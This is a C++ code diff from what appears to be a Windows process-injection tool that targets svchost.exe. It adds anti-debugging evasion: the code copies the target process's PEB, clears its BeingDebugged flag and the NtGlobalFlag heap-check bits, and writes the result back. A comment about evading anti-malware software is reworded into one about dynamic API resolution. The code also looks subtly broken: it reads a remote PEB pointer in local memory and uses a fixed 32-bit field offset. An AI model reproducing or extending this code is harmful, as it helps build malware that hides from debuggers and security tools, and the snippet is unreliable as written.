@@ -8,9 +8,13 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-//TODO: To implement methods to evade detection by anti-malware software in the project
+//TODO: dynamic API resolution instead of static imports
 
 constexpr auto exe_path{R"(C:\Windows\System32\svchost.exe)"};
+
+#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
+#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
+#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
 
 auto main() -> int {
 
@@ -70,6 +74,23 @@ auto main() -> int {
 
     if (!NT_SUCCESS(status)) {
         std::cerr << "NtQueryInformationProcess failed with status: " << status << std::endl;
+    }
+
+    // Manipulate PEB
+    PPEB peb = pbi.PebBaseAddress;
+    PEB manipulated_peb = *peb;
+    manipulated_peb.BeingDebugged = 0; // Set BeingDebugged flag to 0
+
+    // Accessing NtGlobalFlag
+    DWORD *nt_global_flag = reinterpret_cast<DWORD *>(reinterpret_cast<PBYTE>(&manipulated_peb) + 0x68);
+    // wtf how do I clear the heap flags
+    *nt_global_flag &= ~FLG_HEAP_ENABLE_TAIL_CHECK; // Clear heap tail-check flag
+    *nt_global_flag &= ~FLG_HEAP_ENABLE_FREE_CHECK; // Clear heap free-check flag
+    *nt_global_flag &= ~FLG_HEAP_VALIDATE_PARAMETERS; // Clear heap validate parameters flag
+
+    // Write the manipulated PEB back to the target process
+    if (!process::write_process_memory(process_info->hProcess, peb, &manipulated_peb, sizeof(PEB))) {
+        std::cerr << "Failed to write manipulated PEB to target process" << std::endl;
     }
 
     // Allocate memory in the target process
